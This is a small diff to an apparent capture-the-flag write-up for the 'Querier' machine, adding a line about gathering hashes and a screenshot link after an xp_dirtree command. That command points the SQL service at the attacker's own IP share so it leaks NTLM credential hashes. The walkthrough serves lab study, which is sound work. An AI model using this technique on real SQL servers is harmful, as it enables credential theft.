@@ -94,6 +94,10 @@ Next we will send the hashes from the SQL Service with the following command:
 
 xp_dirtree '\\\\[YOUR LOCAL IP]\share\file'
 
+Now you should have been able to gather the hashes on term 2. Please see below for the full output.
+
+![privilege Esc](https://github.com/Miner221272/Writeups/blob/main/Medium/Querier/screenshots/responder_cred_grab.png)
+
 </details>
 
 <details>
